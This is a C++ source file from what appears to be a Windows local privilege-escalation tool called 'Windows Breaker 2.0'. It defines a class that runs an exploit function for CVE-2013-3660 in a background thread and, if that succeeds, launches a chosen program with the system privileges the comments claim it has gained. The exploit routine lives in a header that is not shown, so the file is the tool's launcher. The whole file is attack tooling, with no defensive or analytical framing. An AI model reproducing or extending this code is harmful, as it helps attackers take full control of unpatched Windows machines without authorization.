#include "stdafx.h"
#include "Shellapi.h"
#include "Breaker.h"
#include "CVE-2013-3660.h"

/*
	This class control breaking process
*/

DWORD WINAPI BreakThread(LPVOID lpParam);

CBreaker::CBreaker() : hThread (0) {
}

CBreaker::~CBreaker() {
	if (hThread) {
		CloseHandle(hThread);
	}
}

/*
	Start elevate privileges
*/
bool CBreaker::start (string fileName) {
	//
	SBreakInfo *info = new SBreakInfo;
	info->fileName = fileName;

	//Start thread
	DWORD dwID = 0;
	hThread = CreateThread(NULL, 0, BreakThread, info, 0, &dwID);
	return (hThread);
}

/*
	Break system in background
*/
DWORD WINAPI BreakThread(LPVOID lpParam) {
	SBreakInfo *info = (SBreakInfo *)lpParam;
	
	//
	if (!exCVE_2013_3660()) {
		const char *msg = "Error", *title = "Windows Breaker 2.0";

		//Message
		_asm {
			push 0h
			push title
			push msg
			push 0h
			call MessageBoxA
		}

		//Release info object
		delete info;
		return 0;
	}

	//Success, our process have system privileges
	ShellExecute(NULL, "open", info->fileName.c_str(), NULL, NULL, SW_SHOW);

	const char *msg = "Success", *title = "Windows Breaker 2.0";

	//Message
	_asm {
		push 0h
		push title
		push msg
		push 0h
		call MessageBoxA
	}

	//Release info object
	delete info;
	return 0;
}